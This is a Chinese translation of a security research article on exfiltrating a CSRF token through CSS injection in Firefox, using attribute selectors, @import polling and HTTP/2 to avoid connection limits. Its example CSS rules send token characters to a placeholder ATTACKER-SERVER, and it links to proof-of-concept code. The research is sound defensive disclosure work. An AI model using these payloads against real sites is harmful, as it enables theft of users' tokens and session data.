
# 在Firefox浏览器中利用CSS窃取数据


                                阅读量   
                                **825863**
                            
                        |
                        
                                                                                                                                    ![](./img/198723/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者securitum，文章来源：research.securitum.com
                                <br>原文地址：[https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/](https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/)

译文仅供参考，具体内容表达以及含义原文为准

[![](./img/198723/t01f9530a4b8028e782.png)](./img/198723/t01f9530a4b8028e782.png)



## 0x00 前言

几个月之前，我在Firefox中找到了一个漏洞（[CVE-2019-17016](https://www.mozilla.org/en-US/security/advisories/mfsa2020-01/#CVE-2019-17016)）。在研究过程中，我发现了在Firefox浏览器中利用CSS的一种数据窃取技术，可以通过单个注入点窃取数据，这里我想与大家一起分享相关研究成果。



## 0x01 背景知识

为了演示方便，这里假设我们想窃取`&lt;input&gt;`元素中的CSRF令牌。

```
&lt;input type="hidden" name="csrftoken" value="SOME_VALUE"&gt;
```

我们无法使用脚本（可能是因为CSP），因此想寻找基于样式的注入方法。传统方法是使用属性选择器，如下所示：

```
input[name='csrftoken'][value^='a'] {
  background: url(//ATTACKER-SERVER/leak/a);
}

input[name='csrftoken'][value^='b'] {
  background: url(//ATTACKER-SERVER/leak/b);
}

...

input[name='csrftoken'][value^='z'] {
  background: url(//ATTACKER-SERVER/leak/z);
}
```

如果应用了CSS规则，那么攻击者就能收到HTTP请求，从而获取到令牌的第1个字符。随后，攻击者需要准备另一个样式表，其中包含已窃取的第1个字符，如下所示：

```
input[name='csrftoken'][value^='aa'] {
  background: url(//ATTACKER-SERVER/leak/aa);
}

input[name='csrftoken'][value^='ab'] {
  background: url(//ATTACKER-SERVER/leak/ab);
}

...

input[name='csrftoken'][value^='az'] {
  background: url(//ATTACKER-SERVER/leak/az);
}
```

通常情况下，攻击者需要重新加载`&lt;iframe&gt;`中已加载的页面，以便提供后续样式表。

在2018年，[Pepe Vila](https://twitter.com/cgvwzq)提出了一个非常不错的想法，可以在Chrome浏览器中滥用[CSS递归import](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231)方式，通过单个注入点完成相同任务。在2019年，Nathanial Lattimer（[技巧](https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b)，但稍微做了点改动。下面我稍微总结一下Lattimer的方法，这种方法与本文的思想比较接近（但我在此次研究过程中并不了解Lattimer之前的成果，因此可能有人会认为我在重复造轮子）。

简而言之，第一次注入用到了一堆`import`：

```
@import url(//ATTACKER-SERVER/polling?len=0);
@import url(//ATTACKER-SERVER/polling?len=1);
@import url(//ATTACKER-SERVER/polling?len=2);
...
```

核心思想如下：

1、在一开始，只有第1个`[@import](https://github.com/import)`会返回样式表，其他语句处于连接阻塞状态。

2、第1个`[@import](https://github.com/import)`返回样式表，泄露令牌的第1个字符。

3、当泄露的第1个令牌到达`ATTACKER-SERVER`，第2个`import`停止阻塞，返回包含第1个字符的样式表，尝试泄露第2个字符。

4、当第2个泄露字符到达`ATTACKER-SERVER`时，第3个`import`停止阻塞……以此类推。

这种技术之所以行之有效，是因为Chrome会采用异步方式处理`import`，因此当任何`import`停止阻塞时，Chrome会立即解析该语句并应用规则。



## 0x02 Firefox及样式表处理

前面提到的方法并不适用于Firefox，与Chrome浏览器相比，Firefox对样式表的处理方式大不相同。这里我以几个案例来说明其中差异。

首先，Firefox会采用同步方式处理样式表。因此，当样式表中有多个`import`时，只有当所有`import`都处理完毕时，Firefox才会应用CSS规则。考虑如下案例：

```
&lt;style&gt;
@import '/polling/0';
@import '/polling/1';
@import '/polling/2';
&lt;/style&gt;
```

假设第1个`[@import](https://github.com/import)`返回CSS规则，将页面背景设置为蓝色，后续的`import`处于阻塞状态（比如永远不会返回任何内容，会挂起HTTP连接）。在Chrome浏览器中，页面会立即变为蓝色，而在Firefox中并不会有任何反应。

我们可以将所有`import`放在独立的`&lt;style&gt;`元素中，从而解决该问题：

```
&lt;style&gt;@import '/polling/0';&lt;/style&gt;
&lt;style&gt;@import '/polling/1';&lt;/style&gt;
&lt;style&gt;@import '/polling/2';&lt;/style&gt;
```

在上面代码中，Firefox会分别处理所有样式表，因此页面会立刻变蓝色，其他`import`会在后台处理。

但这里还有另一个问题，假设我们想窃取包含10个字符的令牌：

```
&lt;style&gt;@import '/polling/0';&lt;/style&gt;
&lt;style&gt;@import '/polling/1';&lt;/style&gt;
&lt;style&gt;@import '/polling/2';&lt;/style&gt;
...
&lt;style&gt;@import '/polling/10';&lt;/style&gt;
```

Firefox会立即将10个`import`加入队列。在处理完第1个`import`后，Firefox会将带有已知字符的另一个请求加入队列。这里的问题在于，该请求会被加到队列末尾。而在默认情况下，浏览器有个限制条件，到同一个服务器只能有6个并发连接。因此，带有已知字符的请求永远不会到达目标服务器，因为已经有到该服务器的6个阻塞连接，最终出现死锁现象。

## 0x03 HTTP/2

6个连接的限制条件由TCP层决定，因此到单个服务器只能有6个TCP连接同时存在。在这种情况下，我认为HTTP/2可能派上用场。HTTP/2有许多优点，比如我们可以通过单个连接发送多个HTTP请求（也就是所谓的多路传输（[multiplexing](https://stackoverflow.com/questions/36517829/what-does-multiplexing-mean-in-http-2)）），从而大大提升性能。

Firefox对单个HTTP/2连接的并发请求数也有限制，但默认情况下限制数为`100`（具体设置参考`about:config`中的`network.http.spdy.default-concurrent`）。如果我们需要更多并发数，可以使用不同的主机名，强制Firefox创建第2个TCP连接。比如，如果我们创建到`https://localhost:3000`的`100`个请求，也创建到`https://127.0.0.1:3000`的`50`个请求，此时Firefox就会创建2个TCP连接。



## 0x04 利用方式

现在一切准备就绪，我们的主要利用场景如下：

1、利用代码基于HTTP/2。

2、通过`/polling/:session/:index`端点可以返回CSS，泄露第`:index`字符。该请求会处于阻塞状态，直到前一个请求成功泄露第`index-1`个字符。`:session`路径参数用来区分多次攻击行为。

3、通过`/leak/:session/:value`端点来泄露整个令牌。这里`:value`为获取到的完整值，而不单单是最后一个字符。

4、为了强制Firefox向同一个服务器发起2个TCP连接，这里用到了两个端点，分别为`https://localhost:3000`及`https://127.0.0.1:3000`。

5、端点`/generate`用来生成示例代码。

我创建了一个[测试平台](https://github.com/securitum/research/blob/master/r2020_firefox-css-data-exfil/testbed.html)，目标是通过这种方式窃取`csrftoken`，大家可通过[此处](https://htmlpreview.github.io/?https://github.com/securitum/research/blob/master/r2020_firefox-css-data-exfil/testbed.html)直接访问该平台。

[![](./img/198723/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01c94b940b4ec7ff05.png)

此外，我还在GitHub上托管了[PoC代码](https://github.com/securitum/research/blob/master/r2020_firefox-css-data-exfil/exploit.js)，攻击过程可参考[此处视频](https://research.securitum.com/wp-content/uploads/sites/2/2020/02/firefox-leak.mp4)。

有趣的是，由于我们使用的是HTTP/2，因此攻击过程非常快速，不到3秒就能获取到整个令牌。



## 0x05 总结

在本文中，我演示了如何利用1个注入点，在不想重载页面的情况下，通过CSS窃取数据。这里主要涉及2个要点：

1、将`[@import](https://github.com/import)`规则拆分成多个样式表，后续`import`不会阻塞浏览器对整个样式表的处理。

2、为了绕过TCP并发连接数限制，我们需要通过HTTP/2发起攻击。
